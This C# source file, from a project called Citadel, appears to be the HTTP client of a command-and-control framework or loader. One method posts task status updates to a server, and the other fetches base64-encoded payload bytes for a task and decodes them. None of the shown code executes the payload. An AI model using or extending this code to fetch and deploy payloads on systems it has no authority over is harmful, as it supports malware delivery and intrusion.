using Citadel;
using Newtonsoft.Json;
using Static.Citadel.Models;
using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;

namespace Static.Citadel
{
    internal class Http
    {
        public static bool UpdateTask(OutgoingTaskModel task, string baseUrl)
        {
            string endpoint = $"/tasks/update/{task.Uuid}";

            using (HttpClient client = new HttpClient())
            {
                try
                {
                    string json = JsonConvert.SerializeObject(task);

                    StringContent content = new StringContent(json, Encoding.UTF8, "application/json");

                    HttpResponseMessage response = client.PostAsync(baseUrl + endpoint, content).Result;

                    response.EnsureSuccessStatusCode();

                    return true;
                }
                catch (Exception ex)
                {
                    Logger.Bad($"Failed to update task: {ex.Message}");
                }
            }

            return false;
        }

        public static byte[] GetPayloadBytes(IncomingTaskModel task, string baseUrl)
        {
            string endpoint = $"/payloads/get/{task.Uuid}/bytes";

            using (HttpClient client = new HttpClient())
            {
                try
                {
                    HttpResponseMessage response = client.GetAsync(baseUrl + endpoint).Result;

                    response.EnsureSuccessStatusCode();

                    string json = response.Content.ReadAsStringAsync().Result;

                    if (String.IsNullOrEmpty(json))
                    {
                        Logger.Bad("Empty payload received.");
                        return null;
                    }

                    if (json.Contains("error"))
                    {
                        Logger.Bad($"Error in payload: {json}");
                        return null;
                    }

                    string base64 = JsonConvert.DeserializeObject<Dictionary<string, string>>(json)["payload"];

                    return Convert.FromBase64String(base64);
                }
                catch (Exception ex)
                {
                    Logger.Bad($"Failed to get payload: {ex.Message}");
                }
            }

            return null;
        }
    }
}